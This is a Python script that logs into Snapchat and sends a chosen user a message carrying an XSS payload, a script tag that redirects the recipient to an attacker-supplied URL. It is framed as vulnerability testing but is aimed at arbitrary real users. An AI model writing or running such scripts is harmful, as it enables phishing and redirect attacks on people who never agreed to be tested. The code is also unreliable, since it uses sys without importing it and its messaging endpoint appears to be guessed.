#!/usr/bin/env python3
# URL Injection
# This script sends a Snapchat message with a malicious URL to test for XSS vulnerabilities.

import requests

def send_malicious_url(target_username, malicious_url):
    session = requests.Session()
    login_url = "https://accounts.snapchat.com/accounts/login"
    message_url = "https://app.snapchat.com/api/send_message"

    # Dummy credentials for login (replace with valid credentials for testing)
    payload = {
        'username': 'your_username',
        'password': 'your_password'
    }

    session.post(login_url, data=payload)
    
    message_payload = {
        'to': target_username,
        'message': f'<script>window.location="{malicious_url}";</script>'
    }

    response = session.post(message_url, data=message_payload)
    return response.status_code

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 url_injection.py <target_username> <malicious_url>")
        sys.exit(1)
    
    target_username = sys.argv[1]
    malicious_url = sys.argv[2]

    status_code = send_malicious_url(target_username, malicious_url)
    if status_code == 200:
        print("Malicious URL injected successfully.")
    else:
        print("Failed to inject malicious URL.")
